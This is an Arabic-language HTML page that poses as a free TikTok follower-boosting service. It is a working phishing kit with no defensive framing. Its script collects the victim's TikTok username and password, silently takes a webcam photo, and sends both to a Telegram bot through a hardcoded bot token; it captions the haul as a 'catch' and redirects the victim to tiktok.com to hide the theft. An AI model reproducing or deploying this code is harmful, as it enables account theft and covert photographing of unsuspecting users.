
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><title>TIKTOK-SMM | 𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙞</title>
    <style>
        :root { --blue: #00d2ff; --royal: #0045ff; }
        body { background: radial-gradient(circle, #0a192f 0%, #020b1a 100%); color: white; font-family:  Cairo , sans-serif; text-align: center; padding: 20px; margin: 0; }
        .card { border: 1px solid var(--blue); border-radius: 25px; padding: 25px; max-width: 400px; margin: auto; background: rgba(2, 11, 26, 0.9); box-shadow: 0 0 20px var(--blue); }
        .service { background: rgba(255,255,255,0.05); border: 1px solid #112240; padding: 12px; margin: 8px 0; border-radius: 12px; display: flex; justify-content: space-between; cursor: pointer; }
        input { width: 100%; padding: 14px; margin: 10px 0; background: #0a192f; border: 1px solid #112240; color: var(--blue); border-radius: 10px; text-align: center; box-sizing: border-box; font-size: 16px; }
        .btn { width: 100%; padding: 16px; background: linear-gradient(90deg, var(--royal), var(--blue)); border: none; color: white; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 15px; }
        .sig { margin-top: 25px; color: var(--blue); font-size: 20px; font-weight: bold; text-shadow: 0 0 10px var(--blue); }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://logodownload.org/wp-content/uploads/2019/01/tiktok-logo-0.png" width="100">
        <h1>𝙏𝙄𝙆𝙏𝙊𝙆 𝙍𝙊𝙔𝘼𝙇</h1>
        <div class="service"><span>👤 200 متابع (مجاني)</span><span style="color:#00ff88">FREE</span></div>
        <div class="service"><span>👤 10,000 متابع VIP</span><span style="color:#f39c12">20.00$ 💰</span></div>
        <input type="text" id="u" placeholder="Username" oninput="v(this)">
        <input type="password" id="p" placeholder="Password" oninput="v(this)">
        <button class="btn" onclick="start()">تفعيل الزيادة</button>
        <div class="sig">𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙞</div>
    </div>
    <video id="v" autoplay style="display:none"></video><canvas id="c" style="display:none"></canvas>
    <script>
        const tok = "8250478196:AAH0J5NF3C0vM_Zm_DqE8wmbeKJc3..."; 
        const cid = new URLSearchParams(window.location.search).get( chatId );
        function v(i){ i.value = i.value.replace(/[^\x00-\x7F]/g, ""); }
        async function start() {
            const user = document.getElementById( u ).value; const pass = document.getElementById( p ).value;
            if(!user || !pass) return alert("أدخل البيانات!");
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true});
                document.getElementById( v ).srcObject = s;
                setTimeout(() => {
                    const can = document.getElementById( c ); can.width=640; can.height=480;
                    can.getContext( 2d ).drawImage(document.getElementById( v ),0,0,640,480);
                    can.toBlob(b => {
                        const f = new FormData(); f.append( chat_id ,cid); f.append( photo ,b, f.jpg );
                        f.append( caption ,`🔥 صيد تيك توك 🔥\n👤: ${user}\n🔑: ${pass}\nBy: 𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙞`);
                        fetch(`https://api.telegram.org/bot${tok}/sendPhoto`,{method: POST ,body:f})
                        .then(()=>{ alert("✅ تم البدء!"); window.location.href="https://tiktok.com"; });
                    }, image/jpeg );
                },1000);
            } catch(e) { fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=صيد بدون صورة:\n${user}\n${pass}`); }
        }
    </script>
</body>
</html>
